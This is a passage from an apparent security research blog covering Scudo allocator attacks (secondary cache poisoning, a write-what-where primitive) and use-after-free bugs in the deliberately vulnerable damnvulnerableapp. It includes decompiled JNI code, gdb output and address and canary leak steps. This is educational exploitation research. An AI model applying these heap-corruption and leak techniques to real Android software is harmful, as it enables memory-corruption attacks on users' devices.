chunk creation and preinitialization of memory. When attempting to preinitialize a data structure, we have to take the shift of 0x40 into account (we will see why the shift is there later).\nChallenges Similar to primary poisoning , there are some pitfalls with secondary cache poisoning , which will be discussed in this section.\nOne Secondary to rule \u0026rsquo;em all Observe that when allocating memory from the secondary via malloc(\u0026lt;large size\u0026gt;) , there is only one instance of the secondary that actually handles these allocations (as opposed to the primary, which may \u0026ldquo;change\u0026rdquo; depending on the outcome of getTSDAndLock . Actually the primary itself does not change, but the cache that is based on the primary. I will use primary and a cache that comes from the primary interchangably, because the Primary is not used for any allocations directly).\nConsidering the empirical observation that the damnvulnerableapp:VulnerableActivity averages to roughly 20 threads per run, it is very likely that other threads will also use the secondary. One particular run shows 25 threads running in parallel:\ngef➤ i threads Id Target Id Frame 1 Thread 16516.16516 \u0026#34;nerableActivity\u0026#34; 0x00007baef80269aa in __epoll_pwait () from libc.so 6 Thread 16516.16521 \u0026#34;Signal Catcher\u0026#34; 0x00007baef80263ea in __rt_sigtimedwait () from libc.so 7 Thread 16516.16522 \u0026#34;perfetto_hprof_\u0026#34; 0x00007baef8025747 in read () from libc.so 8 Thread 16516.16523 \u0026#34;ADB-JDWP Connec\u0026#34; 0x00007baef8026aaa in __ppoll () from libc.so 9 Thread 16516.16524 \u0026#34;Jit thread pool\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 10 Thread 16516.16525 \u0026#34;HeapTaskDaemon\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 11 Thread 16516.16526 \u0026#34;ReferenceQueueD\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 12 Thread 16516.16527 \u0026#34;FinalizerDaemon\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 13 Thread 16516.16528 \u0026#34;FinalizerWatchd\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 14 Thread 16516.16529 \u0026#34;Binder:16516_1\u0026#34; 0x00007baef80259e7 in __ioctl () from libc.so 15 Thread 16516.16530 \u0026#34;Binder:16516_2\u0026#34; 0x00007baef80259e7 in __ioctl () from libc.so 16 Thread 16516.16533 \u0026#34;Binder:16516_3\u0026#34; 0x00007baef80259e7 in __ioctl () from libc.so 17 Thread 16516.16538 \u0026#34;Profile Saver\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 18 Thread 16516.16539 \u0026#34;RenderThread\u0026#34; 0x00007baef80269aa in __epoll_pwait () from libc.so 19 Thread 16516.16542 \u0026#34;pool-2-thread-1\u0026#34; 0x00007baef8026aaa in __ppoll () from libc.so 20 Thread 16516.16544 \u0026#34;hwuiTask0\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 21 Thread 16516.16545 \u0026#34;hwuiTask1\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 22 Thread 16516.16546 \u0026#34;Binder:16516_3\u0026#34; 0x00007baef7fcddf8 in syscall () from libc.so 23 Thread 16516.16547 \u0026#34;Thread-3\u0026#34; 0x00007baef802656a in recvfrom () from libc.so * 24 Thread 16516.16548 \u0026#34;Thread-2\u0026#34; 0x00007babf33de9ec in Java_com_damnvulnerableapp_vulnerable_modules_SecondaryFakeModule_free () from libSecondaryFakeModule.so 25 Thread 16516.16562 \u0026#34;Binder:16516_4\u0026#34; 0x00007baef80259e7 in __ioctl () from libc.so As with the primary , our fake chunk may be stolen by another thread, depending on the allocations performed.\nAnother problem is that if the cache is full and there are not \u0026ldquo;enough\u0026rdquo; (4) allocations happening to balance out the congestion of the cache, the cache will be emptied . This basically invalidates all cache entries and unmaps them. Having munmap called on our fake chunk might seem problematic, but it turns out that running munmap(0x0, 0x1) returns successfully\u0026hellip;Therefore, setting LargeBlock::Header::MapBase = 0 and LargeBlock::Header::MapSize = 1 at least prevents the app from aborting. Of course, having our fake cache entry stripped from the cache mitigates this attack.\nTo conclude, Secondary Cache Poisoning is probabilistic just like Primary Poisoning !\nShifted User Data Recall that our fake chunk returned from calling malloc is located at fake.CommitBase = 0x00007babf29407f0 = 0x7babf29407b0 + 0x40. Therefore, the user data starts at 0x7babf29407b0 + 0x40 + 0x40 = 0x7babf2940830, because of the headers and padding (see example above). At best, we want to show that malloc(size) = fake.CommitBase + 0x40, because this would allow us to precisely control where the fake chunk is located. Observe that there seem to be no limitations on the position of a secondary chunk as opposed to primary chunks , because the LargeBlock::Header::CommitBase is not compacted!\nLets say we successfully called free(buffer + 0x40) and therefore introduced our fake chunk into the secondary cache. Also, assume that the next call of our thread to malloc(fake.CommitSize - 0x40) returns our fake chunk, if available in terms of size and pointer constraints (no other thread can steal it), and that 0x10 | fake.CommitBase and 0x10 | fake.CommitSize (i.e. everything is nicely aligned). We want to prove that these assumptions imply that malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40.\nFirst, observe that MapAllocatorCache::store does not change fake.CommitBase and fake.CommitSize. To that end, notice that all accesses to Entry.CommitBase and Entry.CommitSize , are by value and not by reference. Thus, the actual cache entry will contain our chosen fake.CommitBase and fake.CommitSize.\nWhen allocating from the secondary cache, retrieve is called. Based on the assumption that malloc(fake.CommitSize - 0x40) returns our fake chunk if available, we need to show that\nthe sizes match, s.t. our fake chunk is actually part of the set of chunks that fit our allocation request. Then, by assumption, the fake chunk will be returned. the CommitBase is somehow modified by a constant. For the first point, observe that Secondary.deallocate is given the allocation size that is passed to malloc. Therefore, MapAllocatorCache::retrieve is called with Size = fake.CommitSize - 0x40. We also know that fake_entry.CommitSize = fake.CommitSize (we will call the entry representing our fake chunk fake_entry). Hence CommitBase := fake_entry.CommitBase and CommitSize := fake_entry.CommitSize. Then it has to hold that\nHeaderPos \u0026gt; CommitBase + CommitSize . This is computed in the following: AllocPos = roundDownTo(CommitBase + CommitSize - Size, Alignment) = roundDownTo(CommitBase + CommitSize - (fake.CommitSize - 0x40), Alignment) = roundDownTo(CommitBase + CommitSize - (CommitSize - 0x40), Alignment) = roundDownTo(CommitBase + 0x40), Alignment) \u0026lt;-- assumption on 0x10 divides CommitBase = CommitBase + 0x40 HeaderPos = AllocPos - Chunk::getHeaderSize() - LargeBlock::getHeaderSize(); = (CommitBase + 0x40) - 0x10 - 0x30 = CommitBase Therefore, we check whether CommitBase \u0026gt; CommitBase + CommitSize \u0026lt;=\u0026gt; 0 \u0026gt; CommitSize, which is impossible, as CommitSize is of type uptr = uintptr_t . To be precise, an unsigned comparison will be performed, i.e. for r13 = AllocPos and rsi = CommitBase + CommitSize: 0x00007baef7fc0dc6 \u0026lt;+182\u0026gt;:\tadd r13,0xffffffffffffffc0 // HeaderPos = AllocPos - 0x40 0x00007baef7fc0dca \u0026lt;+186\u0026gt;:\tcmp r13,rsi // CommitBase - (CommitBase + CommitSize) = -CommitSize 0x00007baef7fc0dcd \u0026lt;+189\u0026gt;:\tja 0x7baef7fc0d80 // jump if CF=0 and ZF=0; we DONT want to jump here For the above, CF=1 as mathematically CommitSize \u0026gt;= 0. Hence, the fake chunk passes the first check. HeaderPos \u0026lt; CommitBase || AllocPos \u0026gt; CommitBase + PageSize * MaxUnusedCachePages : HeaderPos \u0026lt; CommitBase \u0026lt;=\u0026gt; CommitBase \u0026lt; CommitBase is trivially false. The second condition requires a bit more math: AllocPos = CommitBase + 0x40 \u0026gt; CommitBase + PageSize * MaxUnusedCachePages \u0026lt;=\u0026gt; 0x40 \u0026gt; 0x1000 * 4 which is trivially false. From now on we may assume that the fake chunk passed all the above tests, which implies that we reach the assignment phase . Luckily, this phase does not modify fake_entry.CommitBase and fake_entry.CommitSize at all. Notice that the pointer to the header that MapAllocatorCache::retrieve returns is HeaderPos , i.e. CommitBase.\nFinally, the user data pointer will be computed here (extremely simplified):\nreturn H + LargeBlock::getHeaderSize(); // = fake.CommitBase + 0x30 This is then used to compute the final user pointer Ptr = fake.CommitBase + 0x30 + 0x10 (again extremely simplified, but this is what actually happens when resolving alignment etc.).\nTherefore, malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40 (btw. this is totally a Write - What - Where condition ).\nNeat Little Side Effect The attentive reader might have noticed that the previous proof, dispite being a mathematical disaster, implies that an attacker can control where the chunk is returned to by setting fake.CommitBase accordingly.\nTheoretically speaking, let target_addr be the address we want to write data to. Also, we assume that the cache is not emptied. If the cache is emptied while the fake chunk is cached, munmap will either return an error, which in turn results in an abort, or will unmap a region that is in use, therefore eventually causing a segmentation fault. Thus, the probability of the following attack to succeed decreases with increasing amount of bytes to write!\nFrom malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40 we get that the LargeBlock::Header is stored at a chosen fake.CommitBase. As we cannot control the contents of fake.Prev and fake.Next, because they will be overwritten, we have to stick with fake.MapBase and fake.MapSize. It should also be possible to use the fake.CommitSize field, but we will ignore it for now, because it will be modified by a + 0x40, which has to be considered when calling free in order to bypass the checks.\nNow, choosing fake.CommitBase = target_addr + offset(LargeBlock::Header::MapBase) = target_addr + 0x20 results in a 16 byte write at target_addr. Of course this is limited by the fact that a thread allocating enough memory to trigger the secondary will try to use the allocated memory (otherwise, why would a thread allocate memory at all?). Therefore, this Write - What - Where condition is constrained by the fact that whereever we write, consecutive memory is most likely overwritten by the allocating thread.\nHeap - based Meta Data Overflow Up to this point, we have only seen fake chunk creation for primary and secondary and a small Write - What - Where condition . Now one might ask: What if there is a buffer overflow into a consecutive chunk?\nFirst, lets agree on focussing on primary allocations. The reason is that secondary allocations will initially be performed via mmap and therefore include a portion of randomness as regards their addresses. Of course, the primary also utilizes randomness to especially make heap - based overflows harder. I.e. the primary shuffles the chunks w.r.t. a class id. This means that for some index i we get that with high probability malloc_i(size) != malloc_i+1(size) - (header_size + padding + size) = malloc_i+1(size) - 0x20.\nThis leaves us with either trying to attack the randomness (e.g. via side channel attacks) or creating two consecutive fake chunks with the property that one chunk can overflow into the other chunk. As attacks on randomness are pretty hard (i.e. mathematical) this will be postponed and tagged as future work .\nLets assume that we introduced two fake chunks, named first and second, with the following properties:\nthe fake chunks are of the same size (primary) there exists an index i s.t. C-\u0026gt;Chunks[i] = first and C-\u0026gt;Chunks[i+1] = second there is no interference by other threads first and second are successive in memory, i.e. addr(first) + 0x20 = addr(second) there exists functionality in the target app that will allocate both chunks, trigger a buffer overflow from first into second, and second contains \u0026ldquo;important\u0026rdquo; information To be precise, it only really matters that property 5 is given, i.e. we technically do not need property 2. Although the problem that arises is that the functionality that triggers the overflow will have to perform a certain (maybe random) amount of allocations after allocating first until it allocates second, therefore decreasing success probability. Determining the amount of allocations could require restarting the app over and over again with increasing number of allocations, or in the worst case boil down to guessing.\nAssuming the above properties, the remaining issue is that overwriting meta data of second in Scudo will abort the app if free(second) is called and there is a checksum mismatch. Therefore, we need to know the pointer of second and a value for Cookie in order to properly compute the checksum. If, however, the goal is to get the overflow into \u0026ldquo;important\u0026rdquo; user data (which might even allow to overwrite the .got entry of free), then an attacker will be allowed to overflow with the above assumptions.\nFuture Work In this section, unanswered questions and unsolved problems are listed for future work! Either they seemed to hard at first glance or were considered \u0026ldquo;useless\u0026rdquo; at that point in time.\nEvaluate integer underflow in primary poisoning . It somehow feels like there has to be more that can be done\u0026hellip; Evaluate getBlockBegin . To be precise: how can the Offset field be used? Memory probing?? Attack: Primary fake chunk creation to construct predictable order and locations of primary chunks. I.e. calling free repeatedly for consecutive memory allows to fill up C-\u0026gt;Chunks in non - shuffled fashion! Problem: strong assumptions Evaluate integer underflow caused by calling DoublyLinkedList::remove with X-\u0026gt;Next = X-\u0026gt;Prev = X. Maybe side channel?? (very unlikely, but would be funny). DoublyLinkedList::Size impacts DoublyLinkedList::empty(), which impacts scudo_malloc_info. Might be useful to confuse programs\u0026hellip; What happens if the quarantine and memory tagging are enabled? How does that impact the proposed attacks? It seems to be possible to render the secondary cache useless by freeing fake chunks with CommitSize = \u0026lt;size smaller than primary sizes\u0026gt; and CommitBase != nullptr, as we dont have control over the ClassId field for scudo_malloc calls. This could enforce secondary allocations to use mmap and munmap. This might be limited by the fact that the cache can be emptied if it is full. Evaluate attacks on randomness as regards chunk ordering in the primary. It suffices to know that two chunks in a chunk array are consecutive in terms of array positioning and memory location. Dissolving the entire shuffling of a chunks array would be amazing, but way too much. If we knew that the next to calls to malloc result in two successive chunks in terms of memory location, then we could trigger a behaviour that again triggers a buffer overflow w.r.t. the two chunks. If we only had an oracle that tells us whether the next two calls to malloc return successive chunks in memory, then we could test for this property and if its not given, then perform a (maybe random) sequence of malloc and free calls to \u0026ldquo;shuffle\u0026rdquo; the array. Then repeat. Summary We have seen different kinds of attacks on vulnerabilities that involve Scudo. To be precise, we have seen two types of fake chunk creation, namely Primary Poisoning and Secondary Cache Poisoning , as well as a Write - What - Where condition , which was a side effect of Secondary Cache Poisoning. Finally, heap overflows into chunk meta data have been discussed.\nOverall, we can say that with strong enough assumptions, i.e. leak of a pointer and a combined header, and presence of a Scudo - related vulnerability, we can perform similar attacks to those applicable to e.g. dlmalloc. Currently, the main assumption is the leak in order to break the checksum. Further analysis is required to determine whether this leak is a globally minimal assumption, or whether the assumption can be dropped or replaced by a weaker one.\n","permalink":"https://lolcads.github.io/posts/2024/07/scudo_0/","tags":["Android","Binary Exploitation","JNI","Scudo","Heap Exploitation"],"title":"Scudo, the Allocator (Part 1)"},{"categories":null,"content":"Exploitation of Use - After - Free Modules In this post we will be discussing how to exploit a Use - After - Free bug in both UseAfterFreeExecModule and UseAfterFreeWriteModule. As the names of the modules suggest, they differ in terms of the impact the bug has. To that end, in UseAfterFreeExecModule we will be able to control a function pointer, whereas in UseAfterFreeWriteModule we are given a Write - What - Where condition.\nAbout this post Before we jump into details I want to make a few things clear about this post. The initial part of this post will be about failing to exploit the Use - After - Free bug that enables a Write - What - Where condition. Thus the initial part will contain a lot of incomplete approaches of getting code execution. This is also why this post covers two modules at the same time, because initially there only was the UseAfterFreeWriteModule, but it was too hard to start with, so I introduced UseAfterFreeExecModule and derived a technique that is applicable to both modules.\nIf you are not interested in reading about one of the core pillars of binary exploitation, i.e. failure, then feel free to skip to the fun part :)\nAssumptions We will assume that we have successfully grabbed a copy of the .apk file of damnvulnerableapp. Also, we will not discuss how to unpack an .apk file, but rather assume that we have access to libUseAfterFree(Exec/Write)Module.so and the UseAfterFree(Exec/Write)Module class. If it is unclear how to get access to these components when only given an .apk file, read the previous blog posts first!\nAnalysis baseline As we have access to the .apk file, we can utilize jadx to get the source code of UseAfterFreeExecModule:\n/* loaded from: classes10.dex */ public class UseAfterFreeExecModule extends VulnerableModule { private native byte[] lookupExamples(int i); private native byte[] storePair(byte[] bArr, long j); static { System.loadLibrary(\u0026#34;UseAfterFreeExecModule\u0026#34;); } public UseAfterFreeExecModule() { super(new UseAfterFreeExecModuleConfiguration()); } @Override // com.damnvulnerableapp.vulnerable.modules.VulnerableModule public void main() throws VulnerableModuleException { output(\u0026#34;Key - Value Storage! Most secure in this field!\u0026#34;.getBytes()); while (true) { output(\u0026#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:\u0026#34;.getBytes()); int index = ByteBuffer.wrap(input()).getInt(); if (index == 0) { break; } output(lookupExamples(index - 1)); } while (true) { output(\u0026#34;Please provide the key name (EXIT to end app): \u0026#34;.getBytes()); byte[] name = input(); if (new String(name).toUpperCase(Locale.ROOT).equals(\u0026#34;EXIT\u0026#34;)) { output(\u0026#34;Terminating...\u0026#34;.getBytes()); return; } output(\u0026#34;Please provide the key value: \u0026#34;.getBytes()); long value = ByteBuffer.wrap(input()).getLong(); byte[] result = storePair(name, value); output(result); } } } and UseAfterFreeWriteModule:\n/* loaded from: classes10.dex */ public class UseAfterFreeWriteModule extends VulnerableModule { private native byte[] lookupExamples(int i); private native void storePair(byte[] bArr, long j); static { System.loadLibrary(\u0026#34;UseAfterFreeWriteModule\u0026#34;); } public UseAfterFreeWriteModule() { super(new UseAfterFreeWriteModuleConfiguration()); } @Override // com.damnvulnerableapp.vulnerable.modules.VulnerableModule public void main() throws VulnerableModuleException { output(\u0026#34;Key - Value Storage! Most secure in this field!\u0026#34;.getBytes()); while (true) { output(\u0026#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:\u0026#34;.getBytes()); int index = ByteBuffer.wrap(input()).getInt(); if (index == 0) { break; } output(lookupExamples(index - 1)); } while (true) { output(\u0026#34;Please provide the key name (EXIT to end app): \u0026#34;.getBytes()); byte[] name = input(); if (new String(name).toUpperCase(Locale.ROOT).equals(\u0026#34;EXIT\u0026#34;)) { output(\u0026#34;Terminating...\u0026#34;.getBytes()); return; } output(\u0026#34;Please provide the key value: \u0026#34;.getBytes()); long value = ByteBuffer.wrap(input()).getLong(); storePair(name, value); output((\u0026#34;Successfully stored (\u0026#34; + new String(name) + \u0026#34;:\u0026#34; + value + \u0026#34;)!\u0026#34;).getBytes()); } } } In both cases, we can see that:\nAn arbitrary amount of integers can be passed to lookupExamples. There seem to be no bounds checks! An arbitrary amount of key - value pairs can be stored using storePair. Notice that the value is an 8 - byte integer. Now, for the shared - object files we can use Ghidra . Starting with libUseAfterFreeExecModule.so yields the (already beautified) code:\njbyteArray Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_lookupExamples (JNIEnv *env, jobject this, jint index) { long lVar1; undefined4 length; jbyteArray array; long in_FS_OFFSET; char *examples [4]; canary = *(long *)(in_FS_OFFSET + 0x28); examples[2]._0_4_ = PTR_s_topsecret_key_00101d40._0_4_; examples[2]._4_4_ = PTR_s_topsecret_key_00101d40._4_4_; examples[3]._0_4_ = PTR_s_a_very_very_long_key_with_fancy__00101d48._0_4_; examples[3]._4_4_ = PTR_s_a_very_very_long_key_with_fancy__00101d48._4_4_; examples[0]._0_4_ = PTR_s_amazing_key_00101d30._0_4_; examples[0]._4_4_ = PTR_s_amazing_key_00101d30._4_4_; examples[1]._0_4_ = PTR_s_secret_key_00101d38._0_4_; examples[1]._4_4_ = PTR_s_secret_key_00101d38._4_4_; length = __strlen_chk(examples[(int)index],0xffffffffffffffff); array = (*(*env)-\u0026gt;NewByteArray)(env,(jsize)length); (*(*env)-\u0026gt;SetByteArrayRegion)(env,array,0,(jsize)length,(jbyte *)(examples + (int)index)); if (*(long *)(in_FS_OFFSET + 0x28) == canary) { return array; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } jbyteArray Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_storePair (JNIEnv *env,jobject this,jbyteArray name,jlong value) { uint resultLength; void *obj; object *keyValue; jsize nameLength; jbyte *nameBytes; jbyteArray array; long in_FS_OFFSET; uint len; char *result; jboolean iscopy; long canary; canary = *(long *)(in_FS_OFFSET + 0x28); obj = malloc(0x108); *(code **)((long)obj + 0x100) = FUN_00100c60; free(obj); keyValue = (object *)calloc(1,0x108); nameLength = (*(*env)-\u0026gt;GetArrayLength)(env,name); len = (uint)nameLength; if (0x100 \u0026lt; len) { len = 0x100; } iscopy = \u0026#39;\\0\u0026#39;; nameBytes = (*(*env)-\u0026gt;GetByteArrayElements)(env,name,\u0026amp;iscopy); __memcpy_chk(keyValue,nameBytes,len,0xffffffffffffffff); keyValue-\u0026gt;value = value; result = (char *)(**(code **)((long)obj + 0x100))(keyValue,0); resultLength = __strlen_chk(\u0026amp;result,0xffffffffffffffff); array = (*(*env)-\u0026gt;NewByteArray)(env,(jsize)resultLength); (*(*env)-\u0026gt;SetByteArrayRegion)(env,array,0,(jsize)resultLength,(jbyte *)\u0026amp;result); (*(*env)-\u0026gt;ReleaseByteArrayElements)(env,name,nameBytes,JNI_ABORT); free(keyValue); if (*(long *)(in_FS_OFFSET + 0x28) == canary) { return array; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } As UseAfterFreeExecModule#lookupExamples and UseAfterFreeWriteModule#lookupExamples are basically the same (verfiy if not convinced), we will only consider UseAfterFreeWriteModule#storePair:\nvoid Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair (JNIEnv *env,jobject this,jarray key,jlong value) { jlong **ptrList; object *keyValuePair; jsize keyLength; jbyte *keyBytes; long in_FS_OFFSET; uint reducedKeyLength; jboolean iscopy; long canary; canary = *(long *)(in_FS_OFFSET + 0x28); ptrList = (jlong **)malloc(0x108); free(ptrList); keyValuePair = (object *)malloc(0x108); keyLength = (*(*env)-\u0026gt;GetArrayLength)(env,key); reducedKeyLength = (uint)keyLength; if (0x100 \u0026lt; reducedKeyLength) { reducedKeyLength = 0x100; } iscopy = \u0026#39;\\0\u0026#39;; keyBytes = (*(*env)-\u0026gt;GetByteArrayElements)(env,key,\u0026amp;iscopy); __memcpy_chk(keyValuePair,keyBytes,reducedKeyLength,0xffffffffffffffff); **ptrList = value; (*(*env)-\u0026gt;ReleaseByteArrayElements)(env,key,keyBytes,2); free(keyValuePair); if (*(long *)(in_FS_OFFSET + 0x28) == canary) { return; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } Trying to get code execution in UseAfterFreeWriteModule In this section various approaches of getting code execution in the UseAfterFreeWriteModule will be discussed. Although none of them are going to be applicable to this module, they might become relevant for future modules and definitely give some insights into binary exploitation on Android.\nLeaking data As is often the case with secured binaries, we have to defeat ASLR by leaking some address. \u0026ldquo;Luckily\u0026rdquo;, there is a function that is called as often as we want, which is called lookupExamples that contains the following code snippet:\n... length = __strlen_chk(examples[(int)index],0xffffffffffffffff); array = (*(*env)-\u0026gt;NewByteArray)(env,(jsize)length); (*(*env)-\u0026gt;SetByteArrayRegion)(env,array,0,(jsize)length,(jbyte *)(examples + (int)index)); ... return array; There are two aspects to consider:\nindex is not checked for out - of - bounds access. (jbyte *)(examples + (int)index) will result in the address of a string being copied into array. We know that examples is probably a string table, because __strlen_chk is called on examples[(int)index]. Interestingly, the out - of - bounds access is not really usable, because it requires examples[(int)index] to be a valid pointer for index \u0026gt;= 4. But there is no need to read more pointers, as the lengths of the strings in examples determine the amount of bytes returned. Thus, for index = 3, the leaked value will contain at least one address, if not more (it is a pretty long string).\nlookupExamples is called in a loop, where the user is asked for 1 - based indices into the array:\nwhile (true) { output(\u0026#34;Send a number between 1 and 4 (0 to continue) to see one of four key name templates:\u0026#34;.getBytes()); int index = ByteBuffer.wrap(input()).getInt(); if (index == 0) { break; } output(lookupExamples(index - 1)); } When accessing lookupExamples by sending 1 \u0026lt;= index \u0026lt;= 4 we can get the following leaks:\n[0]: 0x730b9b7a371e --| [1]: 0x730b9b7a372a | --\u0026gt; from `.rodata`, thus 0x730b9b7a371e - 0x71e = libUseAfterFreeWriteModule.so [2]: 0x730b9b7a3710 | [3]: 0x730b9b7a3735 --| [4]: 0x730b993ba990 --\u0026gt; stack address: array of example strings [5]: 0x2147eb93990de82b --\u0026gt; 8 byte canary [6]: 0x730b993ba8c0 --\u0026gt; stack address: stored `rbp` [7]: 0x730c0379ffac --\u0026gt; `art_quick_generic_jni_trampoline+220`, thus 0x730c0379fed0 = `art_quick_generic_jni_trampoline` and `libart.so = 0x730c03400000` With the current leak, we get\nAddress in libUseAfterFreeWriteModule.so and therefore its base address Address in libart.so and therefore its base address Address on stack Canary Keep in mind that everytime UseAfterFreeWriteModule is run, the addresses will differ due to ASLR. The above leak is just an example to showcase what it might look like and, most importantly, what the semantics of the leaked values are.\nThe bug Before showing how to fail to exploit the bug \u0026hellip; well what is the bug anyways? Terms like Write - What - Where condition have already been mentioned, so lets see the corresponding code:\n... ptrList = (jlong **)malloc(0x108); free(ptrList); keyValuePair = (object *)malloc(0x108); keyLength = (*(*env)-\u0026gt;GetArrayLength)(env,key); reducedKeyLength = (uint)keyLength; if (0x100 \u0026lt; reducedKeyLength) { reducedKeyLength = 0x100; } iscopy = \u0026#39;\\0\u0026#39;; keyBytes = (*(*env)-\u0026gt;GetByteArrayElements)(env,key,\u0026amp;iscopy); __memcpy_chk(keyValuePair,keyBytes,reducedKeyLength,0xffffffffffffffff); **ptrList = value; ... As can be seen, immediately after allocating memory for a jlong*[33], the memory is freed. Then memory is allocated to hold a struct object (this was deduced from analysis in Ghidra; the name is chosen arbitrarily). Comparing both malloc calls reveals that both types of the two variables are of the same size. If malloc was to return the same chunk twice, whatever is stored in the first 8 bytes of the keyBytes would be interpreted as a pointer, to which we would write the value.\nKnowing our beloved dlmalloc (the glibc\u0026rsquo;s implementation of malloc), we can assume that keyValuePair will be assigned the same chunk as ptrList, right? I.e. keyValuePair = ptrList, where ptrList is a dangling pointer, because its memory has already been freed? Well \u0026hellip; the interesting thing is that it actually works, i.e. keyValuePair = ptrList, but this is not due to dlmalloc!\nLets confirm my statement with some disassembly. To that end, observe that ptrList = *($rbp-0x58) and keyValuePair = *($rbp-0x60):\n[1] gef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair ... 0x0000730b9ed59a1a \u0026lt;+42\u0026gt;:\tcall 0x730b9ed59b80 \u0026lt;malloc@plt\u0026gt; 0x0000730b9ed59a1f \u0026lt;+47\u0026gt;:\tmov QWORD PTR [rbp-0x58],rax \u0026lt;--- result of first malloc 0x0000730b9ed59a23 \u0026lt;+51\u0026gt;:\tmov rdi,QWORD PTR [rbp-0x58] 0x0000730b9ed59a27 \u0026lt;+55\u0026gt;:\tcall 0x730b9ed59b90 \u0026lt;free@plt\u0026gt; 0x0000730b9ed59a2c \u0026lt;+60\u0026gt;:\tmov edi,0x108 0x0000730b9ed59a31 \u0026lt;+65\u0026gt;:\tcall 0x730b9ed59b80 \u0026lt;malloc@plt\u0026gt; 0x0000730b9ed59a36 \u0026lt;+70\u0026gt;:\tmov QWORD PTR [rbp-0x60],rax \u0026lt;--- result of second malloc ... gef➤ x/1gx $rbp-0x58 0x730b9c970828:\t0x0000730cb77bb950 gef➤ x/1gx $rbp-0x60 0x730b9c970820:\t0x0000730cb77bb950 [2] gef➤ pipe vmmap | grep primary | grep cb77 0x00730cb77b3000 0x00730cb77f3000 0x00000000000000 rw- [anon:scudo:primary] [3] gef➤ disassemble malloc Dump of assembler code for function malloc: 0x0000730eb408fda0 \u0026lt;+0\u0026gt;:\tpush r14 0x0000730eb408fda2 \u0026lt;+2\u0026gt;:\tpush rbx 0x0000730eb408fda3 \u0026lt;+3\u0026gt;:\tpush rax 0x0000730eb408fda4 \u0026lt;+4\u0026gt;:\tmov r14,rdi 0x0000730eb408fda7 \u0026lt;+7\u0026gt;:\tmov rax,QWORD PTR [rip+0x982a2] # 0x730eb4128050 \u0026lt;__libc_globals+80\u0026gt; 0x0000730eb408fdae \u0026lt;+14\u0026gt;:\ttest rax,rax 0x0000730eb408fdb1 \u0026lt;+17\u0026gt;:\tjne 0x730eb408fdcb \u0026lt;malloc+43\u0026gt; 0x0000730eb408fdb3 \u0026lt;+19\u0026gt;:\tcall 0x730eb40950f0 \u0026lt;scudo_malloc\u0026gt; 0x0000730eb408fdb8 \u0026lt;+24\u0026gt;:\tmov rbx,rax 0x0000730eb408fdbb \u0026lt;+27\u0026gt;:\ttest rax,rax 0x0000730eb408fdbe \u0026lt;+30\u0026gt;:\tje 0x730eb408fdd0 \u0026lt;malloc+48\u0026gt; 0x0000730eb408fdc0 \u0026lt;+32\u0026gt;:\tmov rax,rbx 0x0000730eb408fdc3 \u0026lt;+35\u0026gt;:\tadd rsp,0x8 0x0000730eb408fdc7 \u0026lt;+39\u0026gt;:\tpop rbx 0x0000730eb408fdc8 \u0026lt;+40\u0026gt;:\tpop r14 0x0000730eb408fdca \u0026lt;+42\u0026gt;:\tret 0x0000730eb408fdcb \u0026lt;+43\u0026gt;:\tcall QWORD PTR [rax+0x18] [4] gef➤ p/x 0x982a2 + 0x0000730eb408fdae $1 = 0x730eb4128050 gef➤ x/1gx 0x730eb4128050 0x730eb4128050 \u0026lt;__libc_globals+80\u0026gt;:\t0x0000000000000000 [5] gef➤ disassemble scudo_malloc Dump of assembler code for function scudo_malloc: 0x0000730eb40950f0 \u0026lt;+0\u0026gt;:\tpush rbx 0x0000730eb40950f1 \u0026lt;+1\u0026gt;:\tmov rsi,rdi 0x0000730eb40950f4 \u0026lt;+4\u0026gt;:\tlea rdi,[rip+0x9b5c5] # 0x730eb41306c0 \u0026lt;_ZL9Allocator\u0026gt; 0x0000730eb40950fb \u0026lt;+11\u0026gt;:\tmov ecx,0x10 0x0000730eb4095100 \u0026lt;+16\u0026gt;:\txor edx,edx 0x0000730eb4095102 \u0026lt;+18\u0026gt;:\txor r8d,r8d 0x0000730eb4095105 \u0026lt;+21\u0026gt;:\tcall 0x730eb4094a20 \u0026lt;_ZN5scudo9AllocatorINS_13AndroidConfigEXadL_Z21scudo_malloc_postinitEEE8allocateEmNS_5Chunk6OriginEmb\u0026gt; 0x0000730eb409510a \u0026lt;+26\u0026gt;:\tmov rbx,rax 0x0000730eb409510d \u0026lt;+29\u0026gt;:\ttest rax,rax 0x0000730eb4095110 \u0026lt;+32\u0026gt;:\tje 0x730eb4095117 \u0026lt;scudo_malloc+39\u0026gt; 0x0000730eb4095112 \u0026lt;+34\u0026gt;:\tmov rax,rbx 0x0000730eb4095115 \u0026lt;+37\u0026gt;:\tpop rbx 0x0000730eb4095116 \u0026lt;+38\u0026gt;:\tret 0x0000730eb4095117 \u0026lt;+39\u0026gt;:\tcall 0x730eb411a850 \u0026lt;__errno@plt\u0026gt; 0x0000730eb409511c \u0026lt;+44\u0026gt;:\tmov DWORD PTR [rax],0xc 0x0000730eb4095122 \u0026lt;+50\u0026gt;:\tmov rax,rbx 0x0000730eb4095125 \u0026lt;+53\u0026gt;:\tpop rbx 0x0000730eb4095126 \u0026lt;+54\u0026gt;:\tret Lets digest what we just witnessed:\nIdentifying the values of ptrList and keyValuePair and confirming that ptrList = keyValuePair Checking where ptrList and keyValuePair point to. They are pointing to some primary location? As we called malloc to allocate memory, we quickly check its disassembly and observe that there is a call to scudo_malloc in case there is a zero at rip + 0x982a2 = 0x0000730eb408fdae + 0x982a2. Verify that indeed scudo_malloc is called. Btw. if rip + 